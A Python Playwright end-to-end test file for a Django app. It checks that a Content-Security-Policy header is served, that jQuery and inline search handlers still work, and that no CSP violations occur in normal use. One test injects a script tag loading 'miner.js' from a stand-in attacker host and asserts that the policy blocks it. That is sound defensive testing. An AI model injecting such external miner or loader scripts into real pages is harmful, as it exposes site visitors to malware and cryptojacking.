"""
End-to-end checks that the Content-Security-Policy hardens the page without
breaking it: the real browser must load jQuery, run the inline handlers, and
report no CSP violations for normal use.
"""

import pytest
from playwright.sync_api import expect

pytestmark = [pytest.mark.e2e, pytest.mark.django_db(transaction=True)]


def csp_violations(messages):
    return [
        m
        for m in messages
        if "Content Security Policy" in m or "Refused to" in m
    ]


class TestContentSecurityPolicyRuntime:
    def test_dashboard_works_under_csp_with_no_violations(
        self, page, live_server, login, manager, app_config, make_item
    ):
        console = []
        page.on("console", lambda msg: console.append(msg.text))
        page.on("pageerror", lambda err: console.append(str(err)))

        make_item(sku="ABC", description="Bird feeder")
        make_item(sku="XYZ", description="Dog lead")
        login("manager")

        # The CSP header is actually served.
        # (Re-fetch to read headers; the dashboard is already loaded.)
        response = page.request.get(f"{live_server.url}/")
        assert "content-security-policy" in {k.lower() for k in response.headers}

        # jQuery loaded from the allow-listed CDN and the app is functional.
        assert page.evaluate("() => typeof window.jQuery === 'function'")
        expect(page.locator("#itemTable1 tr")).to_have_count(2)

        # An inline-handler feature (search box onkeyup) still works.
        page.locator("#searchBox1").press_sequentially("bird")
        expect(page.locator("#itemTable1 tr")).to_have_count(1)

        assert csp_violations(console) == []

    def test_external_script_is_blocked_by_csp(self, page, live_server, login, manager, app_config):
        # Prove the policy itself blocks a script from a host that is not
        # allow-listed (this is what stops an injected external miner/malware
        # loader). Asserting on the securitypolicyviolation event distinguishes
        # a genuine CSP block from an incidental network failure.
        login("manager")
        result = page.evaluate(
            """() => new Promise(resolve => {
                document.addEventListener('securitypolicyviolation', (e) => {
                    if (String(e.effectiveDirective || e.violatedDirective).includes('script-src')
                        && String(e.blockedURI).includes('evil.example.com')) {
                        resolve('csp-blocked');
                    }
                });
                const s = document.createElement('script');
                s.src = 'https://evil.example.com/miner.js';
                document.head.appendChild(s);
                setTimeout(() => resolve('not-blocked-by-csp'), 3000);
            })"""
        )
        assert result == "csp-blocked"
